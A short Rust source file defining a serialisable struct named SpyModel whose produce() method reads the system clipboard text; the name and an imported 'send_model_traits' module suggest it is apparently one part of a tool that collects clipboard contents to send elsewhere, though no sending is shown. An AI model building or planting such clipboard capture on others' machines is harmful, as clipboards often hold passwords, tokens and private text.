use serde::{Serialize, Deserialize};
use super::send_model_traits::Producer;
use arboard::Clipboard;

#[derive(Debug, Serialize, Deserialize)]
pub struct SpyModel {
    clipboard: String
}

impl Producer for SpyModel {
    fn produce() -> Self {
        let mut clipboard = Clipboard::new().unwrap();
        let text = clipboard.get_text().unwrap();
        Self { clipboard: text }
        
    }
}

